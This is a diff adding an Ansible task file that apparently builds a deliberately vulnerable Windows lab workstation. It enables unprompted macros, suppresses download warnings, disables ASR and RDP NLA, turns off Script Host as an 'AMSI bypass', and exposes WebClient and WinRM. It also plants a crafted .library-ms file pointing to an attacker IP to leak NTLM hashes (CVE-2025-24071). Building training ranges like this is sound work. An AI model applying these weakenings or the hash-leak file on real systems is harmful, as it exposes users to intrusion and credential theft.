@@ -1,0 +1,305 @@
+---
+# ==============================================================================
+# vuln_ia_surface/tasks/ws01_surface.yml
+# Target: ws01.corp.local
+#
+# IA-019..022   Phishing surface: macros enabled (VBAWarnings=1), ASR disabled,
+#               MOTW prompt bypassed (DefaultFileTypeRisk=1808)
+# IA-024        CVE-2025-24071 surface — crafted .library-ms at
+#               C:\Users\Public\Documents\DVADResources.library-ms pointing to
+#               \\<attacker_ip>\share — triggers NTLM hash leak on Explorer preview
+# IA-027 / IA-043  RDP NLA disabled (UserAuthentication=0) — BlueKeep gate
+# IA-033        AMSI bypass registry key (Script Host disabled)
+# IA-045        WebClient service Automatic + running (HTTP coercion)
+# IA-047        WSD/SSDP services running (same as file01)
+# IA-040        WinRM-HTTPS 5986 self-signed listener
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# IA-019 / IA-020 / IA-021 / IA-022: Phishing surface.
+# Macro execution: VBAWarnings=1 enables all macros without prompt.
+# MOTW bypass: DefaultFileTypeRisk=1808 suppresses the "open file" warning dialog
+# for downloaded executables.
+# ASR: disabling Attack Surface Reduction rules removes Office-based spawn blocks.
+# All values are HKCU — applied under the Administrator session context.
+# win_regedit creates the key path automatically if missing.
+# ------------------------------------------------------------------------------
+- name: IA-019..022 - Check Office macro security (VBAWarnings)
+  ansible.windows.win_shell: |
+    $excelVal = (Get-ItemProperty `
+      -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" `
+      -Name VBAWarnings -ErrorAction SilentlyContinue).VBAWarnings
+    $wordVal = (Get-ItemProperty `
+      -Path "HKCU:\Software\Microsoft\Office\16.0\Word\Security" `
+      -Name VBAWarnings -ErrorAction SilentlyContinue).VBAWarnings
+    Write-Output "excel=$excelVal word=$wordVal"
+  register: result_vba_check
+  changed_when: false
+  failed_when: result_vba_check.rc != 0
+
+- name: IA-019..022 - Enable Office macros (VBAWarnings=1, no prompt)
+  ansible.windows.win_regedit:
+    path: "{{ item.path }}"
+    name: VBAWarnings
+    data: 1
+    type: dword
+  loop:
+    - { path: 'HKCU:\Software\Microsoft\Office\16.0\Excel\Security' }
+    - { path: 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'  }
+  when: "'excel=1' not in result_vba_check.stdout or 'word=1' not in result_vba_check.stdout"
+
+- name: IA-020 - Check MOTW DefaultFileTypeRisk registry value
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+      -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" `
+      -Name DefaultFileTypeRisk -ErrorAction SilentlyContinue).DefaultFileTypeRisk
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: result_motw_check
+  changed_when: false
+  failed_when: result_motw_check.rc != 0
+
+- name: IA-020 / IA-021 - Suppress MOTW open-file prompt (DefaultFileTypeRisk=1808)
+  ansible.windows.win_regedit:
+    path: 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations'
+    name: DefaultFileTypeRisk
+    data: 1808
+    type: dword
+  when: result_motw_check.stdout | trim != '1808'
+
+- name: IA-019..022 - Disable ASR rules via registry (Office spawn blocked)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR'
+    name: ExploitGuard_ASR_Rules
+    data: 0
+    type: dword
+
+# ------------------------------------------------------------------------------
+# IA-024: CVE-2025-24071 — .library-ms NTLM hash leak.
+# When Explorer previews or indexes a .library-ms file containing a UNC path
+# pointing to an SMB server, it automatically authenticates to that server,
+# leaking the user's NTLMv2 hash to the attacker's Responder/ntlmrelayx listener.
+# The file is placed in C:\Users\Public\Documents\ (readable by all users).
+# ------------------------------------------------------------------------------
+- name: IA-024 - Check if DVADResources.library-ms already exists
+  ansible.windows.win_shell: |
+    if (Test-Path 'C:\Users\Public\Documents\DVADResources.library-ms') {
+      Write-Output "exists"
+    } else {
+      Write-Output "missing"
+    }
+  register: result_library_ms_check
+  changed_when: false
+  failed_when: result_library_ms_check.rc != 0
+
+- name: IA-024 - Create crafted .library-ms file for NTLM hash leak (CVE-2025-24071)
+  ansible.windows.win_copy:
+    dest: 'C:\Users\Public\Documents\DVADResources.library-ms'
+    content: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE libraryDescription SYSTEM "library-ms-dtd">
+      <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+        <name>@windows.storage.dll,-34582</name>
+        <version>6</version>
+        <isLibraryPinned>true</isLibraryPinned>
+        <iconReference>imageres.dll,-1003</iconReference>
+        <templateInfo>
+          <folderType>{7D49D726-3C21-4F05-99AA-FDC2C9474656}</folderType>
+        </templateInfo>
+        <searchConnectorDescriptionList>
+          <searchConnectorDescription publisher="Microsoft" product="Windows">
+            <description>@windows.storage.dll,-34577</description>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <simpleLocation>
+              <url>\\{{ ia_attacker_ip }}\share</url>
+            </simpleLocation>
+          </searchConnectorDescription>
+        </searchConnectorDescriptionList>
+      </libraryDescription>
+  when: "'missing' in result_library_ms_check.stdout"
+
+# ------------------------------------------------------------------------------
+# IA-027 / IA-043: RDP NLA disabled.
+# UserAuthentication=0 removes Network Level Authentication, allowing
+# BlueKeep (CVE-2019-0708) exploitation and unauthenticated RDP brute-force.
+# Also ensure RDP itself is enabled (fDenyTSConnections=0).
+# ------------------------------------------------------------------------------
+- name: IA-027 - Check RDP NLA (UserAuthentication) registry value
+  ansible.windows.win_shell: |
+    $rdpPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+    $nla = (Get-ItemProperty -Path $rdpPath -Name UserAuthentication `
+              -ErrorAction SilentlyContinue).UserAuthentication
+    $deny = (Get-ItemProperty `
+               -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
+               -Name fDenyTSConnections -ErrorAction SilentlyContinue).fDenyTSConnections
+    Write-Output "nla=$nla deny=$deny"
+  register: result_rdp_nla_check
+  changed_when: false
+  failed_when: result_rdp_nla_check.rc != 0
+
+- name: IA-027 / IA-043 - Disable RDP NLA and ensure RDP is enabled
+  ansible.windows.win_regedit:
+    path: "{{ item.path }}"
+    name: "{{ item.name }}"
+    data: "{{ item.data }}"
+    type: dword
+  loop:
+    - path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+      name: UserAuthentication
+      data: 0
+    - path: 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
+      name: fDenyTSConnections
+      data: 0
+  when: "'nla=0' not in result_rdp_nla_check.stdout or 'deny=0' not in result_rdp_nla_check.stdout"
+
+- name: IA-027 - Open RDP firewall rule (TCP 3389) if not present
+  ansible.windows.win_shell: |
+    $fwRule = Get-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" `
+                -ErrorAction SilentlyContinue
+    if (-not $fwRule) {
+      New-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" `
+        -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow | Out-Null
+      Write-Output "changed: RDP firewall rule added"
+    } else {
+      # Ensure it's enabled
+      Enable-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" `
+        -ErrorAction SilentlyContinue
+      Write-Output "ok: RDP firewall rule exists"
+    }
+  register: result_rdp_fw
+  changed_when: "'changed:' in result_rdp_fw.stdout"
+  failed_when: result_rdp_fw.rc != 0
+
+# ------------------------------------------------------------------------------
+# IA-033: AMSI bypass — Windows Script Host disabled via registry.
+# Setting Enabled=0 under HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings
+# prevents wscript.exe / cscript.exe from running AND disables AMSI for scripts,
+# allowing PowerShell / VBScript payloads to execute unscanned.
+# ------------------------------------------------------------------------------
+- name: IA-033 - Check Windows Script Host Enabled registry value
+  ansible.windows.win_shell: |
+    $val = (Get-ItemProperty `
+      -Path "HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings" `
+      -Name Enabled -ErrorAction SilentlyContinue).Enabled
+    if ($null -eq $val) { Write-Output "not_set" } else { Write-Output $val }
+  register: result_wsh_check
+  changed_when: false
+  failed_when: result_wsh_check.rc != 0
+
+- name: IA-033 - Disable Windows Script Host (AMSI bypass surface, Enabled=0)
+  ansible.windows.win_regedit:
+    path: 'HKLM:\SOFTWARE\Microsoft\Windows Script Host\Settings'
+    name: Enabled
+    data: 0
+    type: dword
+  when: result_wsh_check.stdout | trim != '0'
+
+# ------------------------------------------------------------------------------
+# IA-045: WebClient service on ws01 (HTTP coercion path).
+# WebClient is typically installed on workstations; ensure it's auto-start.
+# ------------------------------------------------------------------------------
+- name: IA-045 (ws01) - Check WebClient service state
+  ansible.windows.win_shell: |
+    $svc = Get-Service -Name WebClient -ErrorAction SilentlyContinue
+    if ($null -eq $svc) { Write-Output "not_found" }
+    else { Write-Output "starttype=$($svc.StartType) status=$($svc.Status)" }
+  register: result_ws01_webclient_check
+  changed_when: false
+  failed_when: result_ws01_webclient_check.rc != 0
+
+- name: IA-045 (ws01) - Set WebClient to Automatic and start
+  ansible.windows.win_shell: |
+    Set-Service WebClient -StartupType Automatic -ErrorAction Stop
+    $svc = Get-Service WebClient
+    if ($svc.Status -ne 'Running') {
+      Start-Service WebClient -ErrorAction Stop
+      Write-Output "changed: WebClient started on ws01"
+    } else {
+      Write-Output "ok: WebClient running on ws01"
+    }
+  register: result_ws01_webclient_start
+  changed_when: "'changed:' in result_ws01_webclient_start.stdout"
+  failed_when: result_ws01_webclient_start.rc != 0
+  when: >
+    'not_found' not in (result_ws01_webclient_check.stdout | default('')) and
+    ('Automatic' not in (result_ws01_webclient_check.stdout | default('')) or
+     'Running' not in (result_ws01_webclient_check.stdout | default('')))
+
+# ------------------------------------------------------------------------------
+# IA-047: WSD / SSDP services on ws01.
+# Same FDResPub / SSDPSRV / fdPHost pattern as file01.
+# ------------------------------------------------------------------------------
+- name: IA-047 (ws01) - Check WSD/SSDP service states
+  ansible.windows.win_shell: |
+    $services = @('FDResPub', 'SSDPSRV', 'fdPHost')
+    $states = @()
+    foreach ($name in $services) {
+      $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+      if ($svc) {
+        $states += "$name=$($svc.StartType)/$($svc.Status)"
+      } else {
+        $states += "$name=not_found"
+      }
+    }
+    Write-Output ($states -join "|")
+  register: result_ws01_wsd_check
+  changed_when: false
+  failed_when: result_ws01_wsd_check.rc != 0
+
+- name: IA-047 (ws01) - Set WSD/SSDP services to Automatic and start
+  ansible.windows.win_shell: |
+    $services = @('FDResPub', 'SSDPSRV', 'fdPHost')
+    $changed = $false
+    foreach ($name in $services) {
+      $svc = Get-Service -Name $name -ErrorAction SilentlyContinue
+      if ($null -eq $svc) { continue }
+      if ($svc.StartType -ne 'Automatic') {
+        Set-Service $name -StartupType Automatic -ErrorAction SilentlyContinue
+        $changed = $true
+      }
+      $svc.Refresh()
+      if ($svc.Status -ne 'Running') {
+        Start-Service $name -ErrorAction SilentlyContinue
+        $changed = $true
+      }
+    }
+    if ($changed) { Write-Output "changed: WSD/SSDP services configured on ws01" }
+    else          { Write-Output "ok: WSD/SSDP services already running on ws01" }
+  register: result_ws01_wsd_set
+  changed_when: "'changed:' in result_ws01_wsd_set.stdout"
+  failed_when: result_ws01_wsd_set.rc != 0
+  when: >
+    'Automatic/Running' not in (result_ws01_wsd_check.stdout | default('')) or
+    result_ws01_wsd_check.stdout | default('') | regex_findall('Automatic/Running') | length < 3
+
+# ------------------------------------------------------------------------------
+# IA-040: WinRM-HTTPS 5986 self-signed listener on ws01.
+# ------------------------------------------------------------------------------
+- name: IA-040 (ws01) - Check if WinRM HTTPS listener exists
+  ansible.windows.win_shell: |
+    $listener = winrm enumerate winrm/config/Listener 2>&1 |
+                  Select-String "Transport = HTTPS"
+    if ($listener) { Write-Output "exists" } else { Write-Output "missing" }
+  register: result_ws01_winrm_https_check
+  changed_when: false
+  failed_when: result_ws01_winrm_https_check.rc != 0
+
+- name: IA-040 (ws01) - Create self-signed cert and WinRM HTTPS listener
+  ansible.windows.win_shell: |
+    $cert = New-SelfSignedCertificate `
+              -DnsName $env:COMPUTERNAME `
+              -CertStoreLocation "Cert:\LocalMachine\My" `
+              -NotAfter (Get-Date).AddYears(10) `
+              -ErrorAction Stop
+    $thumb = $cert.Thumbprint
+    winrm create winrm/config/Listener?Address=*+Transport=HTTPS `
+      "@{Hostname=`"*`";CertificateThumbprint=`"$thumb`"}" | Out-Null
+    $fwRule = Get-NetFirewallRule -DisplayName "WinRM HTTPS 5986" -ErrorAction SilentlyContinue
+    if (-not $fwRule) {
+      New-NetFirewallRule -DisplayName "WinRM HTTPS 5986" `
+        -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow | Out-Null
+    }
+    Write-Output "changed: WinRM HTTPS listener created on ws01"
+  register: result_ws01_winrm_https_create
+  changed_when: "'changed:' in result_ws01_winrm_https_create.stdout"
+  failed_when: result_ws01_winrm_https_create.rc != 0
+  when: "'missing' in result_ws01_winrm_https_check.stdout"
